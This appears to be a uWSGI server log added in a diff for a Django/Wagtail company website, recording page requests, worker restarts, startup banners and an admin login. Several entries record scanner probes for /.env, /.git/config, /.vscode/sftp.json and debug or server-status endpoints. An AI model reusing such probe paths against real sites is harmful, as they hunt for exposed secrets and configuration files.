+[pid: 1102|app: 0|req: 6/8] 49.190.45.27 () {42 vars in 784 bytes} [Thu Jun  8 01:54:09 2023] GET / => generated 129706 bytes in 89 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 7/9] 83.97.73.89 () {38 vars in 628 bytes} [Thu Jun  8 01:57:49 2023] POST /Autodiscover/Autodiscover.xml => generated 123376 bytes in 48 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 8/10] 49.190.45.27 () {42 vars in 809 bytes} [Thu Jun  8 01:58:35 2023] GET /services/ => generated 124333 bytes in 85 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 9/11] 49.190.45.27 () {42 vars in 800 bytes} [Thu Jun  8 01:59:09 2023] GET / => generated 129706 bytes in 88 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 10/12] 219.78.235.164 () {40 vars in 780 bytes} [Thu Jun  8 02:00:58 2023] GET / => generated 129706 bytes in 90 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 11/13] 179.43.177.244 () {30 vars in 336 bytes} [Thu Jun  8 02:01:17 2023] GET / => generated 129706 bytes in 162 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 12/14] 49.190.45.27 () {42 vars in 809 bytes} [Thu Jun  8 02:03:13 2023] GET /services/ => generated 124333 bytes in 84 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 13/15] 52.167.144.79 () {42 vars in 646 bytes} [Thu Jun  8 02:07:41 2023] GET / => generated 129706 bytes in 90 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 14/16] 49.190.45.27 () {42 vars in 818 bytes} [Thu Jun  8 02:08:11 2023] GET /about-us/ => generated 124291 bytes in 82 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 15/17] 49.190.45.27 () {42 vars in 814 bytes} [Thu Jun  8 02:08:13 2023] GET /career/ => generated 124280 bytes in 86 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 16/18] 219.78.235.164 () {40 vars in 779 bytes} [Thu Jun  8 02:11:07 2023] GET / => generated 129706 bytes in 202 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 17/19] 219.78.235.164 () {42 vars in 841 bytes} [Thu Jun  8 02:11:11 2023] GET /services/ => generated 124333 bytes in 84 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 18/20] 219.78.235.164 () {42 vars in 850 bytes} [Thu Jun  8 02:11:13 2023] GET /about-us/ => generated 124291 bytes in 83 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 19/21] 52.167.144.79 () {42 vars in 646 bytes} [Thu Jun  8 02:28:23 2023] GET / => generated 129706 bytes in 197 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 20/22] 219.78.235.164 () {42 vars in 833 bytes} [Thu Jun  8 02:30:45 2023] GET / => generated 129706 bytes in 1940 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 21/23] 219.78.235.164 () {44 vars in 864 bytes} [Thu Jun  8 02:30:50 2023] GET / => generated 129706 bytes in 1949 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 22/24] 219.78.235.164 () {46 vars in 886 bytes} [Thu Jun  8 02:30:57 2023] GET / => generated 129706 bytes in 2355 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 23/25] 219.78.235.164 () {40 vars in 780 bytes} [Thu Jun  8 02:31:19 2023] GET / => generated 129706 bytes in 1793 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 24/26] 219.78.235.164 () {44 vars in 833 bytes} [Thu Jun  8 02:31:23 2023] GET / => generated 129706 bytes in 2040 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+Thu Jun  8 02:31:51 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 02:31:51 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 06:32:45 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x55ba3f28a930
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55ba3f28a930 pid: 2079 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2079)
+spawned uWSGI worker 1 (pid: 2080, cores: 2)
+spawned uWSGI worker 2 (pid: 2081, cores: 2)
+spawned uWSGI worker 3 (pid: 2082, cores: 2)
+spawned uWSGI worker 4 (pid: 2083, cores: 2)
+[pid: 2083|app: 0|req: 1/1] 219.78.235.164 () {42 vars in 811 bytes} [Thu Jun  8 02:32:49 2023] GET / => generated 129590 bytes in 760 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 2/2] 219.78.235.164 () {42 vars in 841 bytes} [Thu Jun  8 02:41:35 2023] GET /services/ => generated 124333 bytes in 179 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 3/3] 20.58.190.50 () {40 vars in 730 bytes} [Thu Jun  8 02:42:41 2023] GET / => generated 129590 bytes in 222 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 4/4] 91.213.50.8 () {36 vars in 537 bytes} [Thu Jun  8 02:43:07 2023] GET /.git/config => generated 123376 bytes in 204 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 5/5] 185.233.19.114 () {30 vars in 324 bytes} [Thu Jun  8 02:43:28 2023] GET / => generated 129590 bytes in 88 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 6/6] 139.144.150.26 () {30 vars in 332 bytes} [Thu Jun  8 02:43:34 2023] GET / => generated 129042 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 7/7] 68.183.13.153 () {30 vars in 332 bytes} [Thu Jun  8 02:43:34 2023] GET / => generated 129590 bytes in 83 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 8/8] 139.144.150.26 () {32 vars in 489 bytes} [Thu Jun  8 02:43:34 2023] GET / => generated 129042 bytes in 85 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 10/9] 139.144.150.26 () {34 vars in 431 bytes} [Thu Jun  8 02:43:34 2023] GET /.vscode/sftp.json => generated 123165 bytes in 75 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 10/10] 68.183.13.153 () {32 vars in 489 bytes} [Thu Jun  8 02:43:34 2023] GET / => generated 129590 bytes in 108 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 11/11] 139.144.150.26 () {34 vars in 407 bytes} [Thu Jun  8 02:43:35 2023] GET /about => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 12/12] 139.144.150.26 () {34 vars in 458 bytes} [Thu Jun  8 02:43:35 2023] GET /debug/default/view?panel=config => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 13/13] 139.144.150.26 () {36 vars in 450 bytes} [Thu Jun  8 02:43:35 2023] GET /v2/_catalog => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 118 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 14/14] 139.144.150.26 () {34 vars in 547 bytes} [Thu Jun  8 02:43:35 2023] GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application => generated 123165 bytes in 324 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 2082|app: 0|req: 2/15] 68.183.13.153 () {34 vars in 431 bytes} [Thu Jun  8 02:43:35 2023] GET /.vscode/sftp.json => generated 123376 bytes in 674 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 2082|app: 0|req: 2/16] 139.144.150.36 () {30 vars in 329 bytes} [Thu Jun  8 02:43:35 2023] GET / => generated 129590 bytes in 848 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 15/17] 139.144.150.26 () {34 vars in 423 bytes} [Thu Jun  8 02:43:36 2023] GET /server-status => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+[pid: 2082|app: 0|req: 3/18] 139.144.150.26 () {34 vars in 421 bytes} [Thu Jun  8 02:43:36 2023] GET /login.action => generated 123165 bytes in 93 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 16/19] 139.144.150.26 () {36 vars in 522 bytes} [Thu Jun  8 02:43:36 2023] GET /_all_dbs => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 115 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 17/20] 139.144.150.26 () {34 vars in 415 bytes} [Thu Jun  8 02:43:36 2023] GET /.DS_Store => generated 123165 bytes in 291 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 2081|app: 0|req: 2/21] 68.183.13.153 () {34 vars in 407 bytes} [Thu Jun  8 02:43:36 2023] GET /about => generated 0 bytes in 917 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 18/22] 68.183.13.153 () {34 vars in 458 bytes} [Thu Jun  8 02:43:37 2023] GET /debug/default/view?panel=config => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 20/23] 68.183.13.153 () {36 vars in 450 bytes} [Thu Jun  8 02:43:37 2023] GET /v2/_catalog => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 118 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 21/24] 139.144.150.26 () {34 vars in 405 bytes} [Thu Jun  8 02:43:37 2023] GET /.env => generated 123165 bytes in 717 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 21/25] 68.183.13.153 () {34 vars in 547 bytes} [Thu Jun  8 02:43:37 2023] GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application => generated 123376 bytes in 444 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 23/26] 68.183.13.153 () {34 vars in 423 bytes} [Thu Jun  8 02:43:38 2023] GET /server-status => generated 0 bytes in 62 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
+[pid: 2083|app: 0|req: 24/27] 139.144.150.26 () {34 vars in 419 bytes} [Thu Jun  8 02:43:38 2023] GET /.git/config => generated 123165 bytes in 1803 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 2083|app: 0|req: 24/28] 68.183.13.153 () {34 vars in 421 bytes} [Thu Jun  8 02:43:38 2023] GET /login.action => generated 123376 bytes in 1552 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 2081|app: 0|req: 3/29] 139.144.150.26 () {34 vars in 433 bytes} [Thu Jun  8 02:43:46 2023] GET /telescope/requests => generated 0 bytes in 192 msecs (HTTP/1.1 301) 3 headers in 125 bytes (1 switches on core 0)
+Gracefully killing worker 3 (pid: 2082)...
+Gracefully killing worker 2 (pid: 2081)...
+Gracefully killing worker 4 (pid: 2083)...
+Gracefully killing worker 1 (pid: 2080)...
+...gracefully killing workers...
+Thu Jun  8 02:52:14 2023 - worker 1 (pid: 2080) is taking too much time to die...NO MERCY !!!
+Thu Jun  8 02:52:15 2023 - worker 2 (pid: 2081) is taking too much time to die...NO MERCY !!!
+Thu Jun  8 02:52:15 2023 - worker 3 (pid: 2082) is taking too much time to die...NO MERCY !!!
+Thu Jun  8 02:52:15 2023 - worker 4 (pid: 2083) is taking too much time to die...NO MERCY !!!
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (0.0.0.0:3031)
+running /home/wzr/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 02:52:16 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x55f62e34ff10
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x55f62e34ff10 pid: 2079 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 2079)
+spawned uWSGI worker 1 (pid: 2613, cores: 2)
+spawned uWSGI worker 2 (pid: 2614, cores: 2)
+spawned uWSGI worker 3 (pid: 2616, cores: 2)
+spawned uWSGI worker 4 (pid: 2617, cores: 2)
+[pid: 2616|app: 0|req: 2/1] 68.183.13.153 () {34 vars in 433 bytes} [Thu Jun  8 02:52:19 2023] GET /telescope/requests => generated 0 bytes in 1333 msecs (HTTP/1.1 301) 3 headers in 125 bytes (1 switches on core 0)
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 07:09:34 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x55f75955a8e0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x55f75955a8e0 pid: 1203 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1203)
+spawned uWSGI worker 1 (pid: 1204, cores: 2)
+spawned uWSGI worker 2 (pid: 1205, cores: 2)
+spawned uWSGI worker 3 (pid: 1206, cores: 2)
+spawned uWSGI worker 4 (pid: 1207, cores: 2)
+[pid: 1205|app: 0|req: 1/1] 219.78.235.164 () {42 vars in 820 bytes} [Thu Jun  8 03:09:41 2023] GET / => generated 129590 bytes in 1728 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1205|app: 0|req: 2/2] 219.78.235.164 () {58 vars in 1096 bytes} [Thu Jun  8 03:10:25 2023] GET / => generated 129590 bytes in 130 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1205|app: 0|req: 3/3] 219.78.235.164 () {58 vars in 1096 bytes} [Thu Jun  8 03:10:41 2023] GET / => generated 129590 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1205|app: 0|req: 4/4] 219.78.235.164 () {56 vars in 1065 bytes} [Thu Jun  8 03:10:51 2023] GET / => generated 129042 bytes in 100 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1205|app: 0|req: 5/5] 219.78.235.164 () {56 vars in 1074 bytes} [Thu Jun  8 03:11:03 2023] GET /admin => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 1207|app: 0|req: 1/6] 219.78.235.164 () {56 vars in 1076 bytes} [Thu Jun  8 03:11:03 2023] GET /admin/ => generated 0 bytes in 455 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 0)
+[pid: 1207|app: 0|req: 2/7] 219.78.235.164 () {56 vars in 1113 bytes} [Thu Jun  8 03:11:04 2023] GET /admin/login/?next=/admin/ => generated 8401 bytes in 74 msecs (HTTP/1.1 200) 10 headers in 470 bytes (1 switches on core 1)
+[pid: 1205|app: 0|req: 6/8] 219.78.235.164 () {56 vars in 1040 bytes} [Thu Jun  8 03:11:06 2023] GET /admin/jsi18n/ => generated 0 bytes in 2 msecs (HTTP/1.1 302) 10 headers in 379 bytes (1 switches on core 0)
+[pid: 1206|app: 0|req: 2/9] 219.78.235.164 () {56 vars in 1053 bytes} [Thu Jun  8 03:11:06 2023] GET /admin/sprite-fb2186d2/ => generated 120381 bytes in 125 msecs (HTTP/1.1 200) 8 headers in 322 bytes (1 switches on core 1)
+[pid: 1206|app: 0|req: 2/10] 219.78.235.164 () {56 vars in 1077 bytes} [Thu Jun  8 03:11:06 2023] GET /admin/login/?next=/admin/jsi18n/ => generated 8408 bytes in 456 msecs (HTTP/1.1 200) 10 headers in 470 bytes (1 switches on core 0)
+[pid: 1206|app: 0|req: 3/11] 49.190.45.27 () {58 vars in 1075 bytes} [Thu Jun  8 03:11:08 2023] GET / => generated 129590 bytes in 151 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1205|app: 0|req: 7/12] 219.78.235.164 () {68 vars in 1411 bytes} [Thu Jun  8 03:11:12 2023] POST /admin/login/ => generated 8638 bytes in 354 msecs (HTTP/1.1 200) 10 headers in 470 bytes (1 switches on core 0)
+[pid: 1205|app: 0|req: 8/13] 219.78.235.164 () {56 vars in 1026 bytes} [Thu Jun  8 03:11:13 2023] GET /admin/jsi18n/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 10 headers in 379 bytes (1 switches on core 1)
+[pid: 1205|app: 0|req: 9/14] 219.78.235.164 () {56 vars in 1063 bytes} [Thu Jun  8 03:11:13 2023] GET /admin/login/?next=/admin/jsi18n/ => generated 8408 bytes in 25 msecs (HTTP/1.1 200) 10 headers in 470 bytes (1 switches on core 1)
+[pid: 1204|app: 0|req: 1/15] 219.78.235.164 () {56 vars in 1041 bytes} [Thu Jun  8 03:11:13 2023] GET /admin/sprite-fb2186d2/ => generated 120381 bytes in 514 msecs (HTTP/1.1 200) 8 headers in 322 bytes (1 switches on core 0)
+[pid: 1204|app: 0|req: 2/16] 219.78.235.164 () {68 vars in 1399 bytes} [Thu Jun  8 03:11:17 2023] POST /admin/login/ => generated 0 bytes in 390 msecs (HTTP/1.1 302) 12 headers in 578 bytes (1 switches on core 1)
+[pid: 1205|app: 0|req: 10/17] 219.78.235.164 () {62 vars in 1272 bytes} [Thu Jun  8 03:11:18 2023] GET /admin/ => generated 26462 bytes in 11372 msecs (HTTP/1.1 200) 10 headers in 471 bytes (1 switches on core 0)
+[pid: 1205|app: 0|req: 12/18] 219.78.235.164 () {56 vars in 1078 bytes} [Thu Jun  8 03:11:31 2023] GET /admin/sprite-fb2186d2/ => generated 120381 bytes in 253 msecs (HTTP/1.1 200) 8 headers in 322 bytes (1 switches on core 0)
+[pid: 1205|app: 0|req: 12/19] 219.78.235.164 () {56 vars in 1065 bytes} [Thu Jun  8 03:11:30 2023] GET /admin/jsi18n/ => generated 3343 bytes in 1589 msecs (HTTP/1.1 200) 9 headers in 342 bytes (1 switches on core 1)
+[pid: 1207|app: 0|req: 4/20] 219.78.235.164 () {58 vars in 1222 bytes} [Thu Jun  8 03:12:51 2023] GET /admin/api/main/pages/?child_of=1&for_explorer=1&fields=parent => generated 2798 bytes in 65845 msecs (HTTP/1.1 200) 10 headers in 361 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 3 buried after 2 seconds
+binary reloading uWSGI...
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (0.0.0.0:3031)
+running /home/wzr/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 03:23:36 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x559215cccec0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x559215cccec0 pid: 1203 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1203)
+spawned uWSGI worker 1 (pid: 1833, cores: 2)
+spawned uWSGI worker 2 (pid: 1834, cores: 2)
+spawned uWSGI worker 3 (pid: 1835, cores: 2)
+spawned uWSGI worker 4 (pid: 1836, cores: 2)
+Thu Jun  8 03:25:04 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 07:32:59 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
